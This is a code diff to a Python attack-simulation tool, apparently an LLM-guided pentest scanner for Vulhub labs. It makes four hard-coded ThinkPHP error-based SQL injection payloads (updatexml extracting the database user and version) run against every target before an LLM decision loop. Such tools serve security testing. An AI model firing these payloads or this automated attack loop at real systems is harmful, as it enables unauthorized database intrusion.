@@ -87,63 +87,61 @@ class AttackSimulator:
             logger.info(f"🔍 侦察完成，识别技术栈: {self.context['technologies']}")
             logger.info(f"📦 检测到的框架: {[fw.value for fw in self.detected_frameworks]}")
 
-            # 2. 模拟攻击循环 (全时决策)
-            max_rounds = 10
+            # 2. VULHUB 快速扫描: 直接注入预定义 payload
+            logger.info("🔧 开始 VULHUB 快速扫描...")
             found_vulns = []
+            vulhub_payloads = [
+                {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,user()),0)]": "1"}},
+                {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,version()),0)]": "1"}},
+                {"path": "index.php", "params": {"s": "/index/index/index", "where[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
+                {"path": "index.php", "params": {"s": "/index/index/index", "order[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
+            ]
             
-            # VULHUB 调试模式: 如果检测到 ThinkPHP,直接使用已知 payload
-            if FrameworkType.THINKPHP in self.detected_frameworks:
-                logger.info("🔧 VULHUB调试: 检测到 ThinkPHP,使用预定义 payload 测试")
-                thinkphp_payloads = [
-                    {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,user()),0)]": "1"}},
-                    {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,version()),0)]": "1"}},
-                    {"path": "index.php", "params": {"s": "/index/index/index", "where[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
-                    {"path": "index.php", "params": {"s": "/index/index/index", "order[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
-                ]
-                
-                for pp in thinkphp_payloads:
-                    url = f"{self.target}/{pp['path']}"
-                    try:
-                        resp = await client.get(url, params=pp["params"], follow_redirects=True)
-                        step = AttackStep(
-                            step_id=f"vulhub-{uuid.uuid4().hex[:8]}",
-                            phase=AttackPhase.EXPLOITATION,
-                            stage_name="thinkphp_sqli_probe",
-                            url=resp.url,
-                            payload=str(pp["params"]),
-                            status_code=resp.status_code,
+            for pp in vulhub_payloads:
+                try:
+                    resp = await client.get(f"{self.target}/{pp['path']}", params=pp["params"], follow_redirects=True)
+                    step = AttackStep(
+                        step_id=f"vulhub-{uuid.uuid4().hex[:8]}",
+                        phase=AttackPhase.EXPLOITATION,
+                        stage_name="thinkphp_sqli_probe",
+                        url=str(resp.url),
+                        payload=str(pp["params"]),
+                        status_code=resp.status_code,
+                        response_body=resp.text,
+                        success=self._is_potential_vuln_basic(resp),
+                        duration_ms=0
+                    )
+                    self.history.append(step)
+                    
+                    if self._is_potential_vuln(step):
+                        logger.info(f"🎯 疑似 ThinkPHP SQL 注入,规则引擎验证...")
+                        is_valid, reason = self.rule_engine.validate_vulnerability(
+                            plugin_id="thinkphp-sqli",
+                            detected_frameworks=self.detected_frameworks,
                             response_body=resp.text,
-                            success=self._is_potential_vuln_basic(resp),
-                            duration_ms=0
+                            response_headers=dict(resp.headers),
+                            request_url=str(resp.url),
+                            matched_keywords=[],
+                            framework_versions=self.framework_versions,
+                            request_payload=str(pp["params"]),
                         )
-                        self.history.append(step)
                         
-                        if self._is_potential_vuln(step):
-                            logger.info(f"🎯 疑似 ThinkPHP SQL 注入,规则引擎验证...")
-                            is_valid, reason = self.rule_engine.validate_vulnerability(
-                                plugin_id="thinkphp-sqli",
-                                detected_frameworks=self.detected_frameworks,
-                                response_body=resp.text,
-                                response_headers=dict(resp.headers),
-                                request_url=str(resp.url),
-                                matched_keywords=[],
-                                framework_versions=self.framework_versions,
-                                request_payload=str(pp["params"]),
-                            )
-                            
-                            if is_valid:
-                                logger.info(f"✅ 规则引擎确认: {reason}")
-                                found_vulns.append({
-                                    "url": str(resp.url),
-                                    "payload": str(pp["params"]),
-                                    "evidence": resp.text[:1000],
-                                    "llm_analysis": f"规则引擎验证: {reason}"
-                                })
-                            else:
-                                logger.info(f"❌ 规则引擎未确认: {reason}")
-                    except Exception as e:
-                        logger.warning(f"VULHUB payload 测试失败: {e}")
-                
+                        if is_valid:
+                            logger.info(f"✅ 规则引擎确认: {reason}")
+                            found_vulns.append({
+                                "url": str(resp.url),
+                                "payload": str(pp["params"]),
+                                "evidence": resp.text[:1000],
+                                "llm_analysis": f"规则引擎验证: {reason}"
+                            })
+                        else:
+                            logger.info(f"❌ 规则引擎未确认: {reason}")
+                except Exception as e:
+                    logger.warning(f"VULHUB payload 测试失败: {e}")
+            
+            # 如果已发现漏洞,直接返回结果,不再进行 LLM 循环
+            if found_vulns:
+                logger.info(f"✅ VULHUB 扫描完成,发现 {len(found_vulns)} 个漏洞")
                 return {
                     "target": self.target,
                     "vulnerabilities": found_vulns,
@@ -151,8 +149,9 @@ class AttackSimulator:
                     "status": "completed"
                 }
 
+            # 3. 模拟攻击循环 (LLM 决策,仅当 VULHUB 未找到漏洞时)
+            max_rounds = 10
             for i in range(max_rounds):
-                self.context["current_phase"] = "exploitation"
                 
                 # 调用 LLM 决策下一步
                 decision = await self.llm.decide_next_step(self.context)
